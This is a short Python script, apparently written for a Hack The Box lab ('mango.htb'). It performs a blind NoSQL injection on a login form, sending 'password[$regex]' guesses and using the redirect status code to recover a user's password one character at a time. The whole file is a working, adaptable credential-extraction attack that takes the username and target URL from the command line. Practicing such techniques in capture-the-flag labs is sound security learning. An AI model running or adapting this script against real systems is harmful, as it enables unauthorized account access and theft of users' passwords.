import requests
import string,sys

list=[x for x in  string.ascii_lowercase]
list+=[x for x in string.ascii_uppercase]
list+=[x for x in  string.digits]
list+=['!','@','#','$','%','^','(',')','@','_','{','}','>','<','~','[',']']
#print(list)
username =sys.argv[1]
url=sys.argv[2] 
#http://staging-order.mango.htb
password="^"
count=0
flag=True
print("---- Extracting password for the username ----",username)
while flag:
    #flag=False
    for letters in list:
       count+=1
       ####Change the datas according to the Content of the web page
       datas={'username':username,'password[$regex]':password+letters,'login':'login'}
       req=requests.post(url,data=datas,allow_redirects=False)
       #print("Password sending is",password+letters)
       if(req.status_code==302):
            password+=letters
            #flag=True
            print("Got a  character",letters)
            
            if(len(password) <10 and count>5000 or letters=="$"):
                   print("Please remove first and last character from  the password")
                   print("The password for user {0} is: {1} ".format(username,password)) 
                   exit(0)
            break             
            
     

      
